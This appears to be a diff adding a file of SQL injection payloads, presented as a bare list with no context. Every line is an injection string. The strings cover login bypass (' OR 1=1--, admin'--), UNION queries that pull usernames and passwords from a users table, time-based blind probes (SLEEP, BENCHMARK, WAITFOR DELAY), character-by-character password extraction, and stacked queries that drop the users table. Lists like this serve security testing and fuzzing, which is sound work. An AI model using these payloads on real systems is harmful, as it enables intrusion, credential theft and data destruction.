@@ -1,1 +1,32 @@
-
+' OR 1=1--
+' OR '1'='1'--
+' OR 1=1#
+' OR '1'='1'#
+' OR 1=1/*
+' OR '1'='1'/*
+admin'--
+admin'#
+admin'/*
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+' AND 1=1--
+' AND 1=2--
+' OR SLEEP(5)--
+' OR BENCHMARK(1000000,MD5(1))--
+' OR 1=1; DROP TABLE users; --
+' OR 1=1; WAITFOR DELAY '0:0:5'--
+' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1)) > 64--
+" OR "" = "
+" OR "" = "
+" OR 1=1--
+" OR 1=1#
+" OR 1=1/*
+" UNION SELECT NULL,NULL,NULL--
+" UNION SELECT username,password FROM users--
+" AND 1=1--
+" AND 1=2--
+" OR SLEEP(5)--
+" OR BENCHMARK(1000000,MD5(1))--
+" OR 1=1; DROP TABLE users; --
+" OR 1=1; WAITFOR DELAY '0:0:5'--
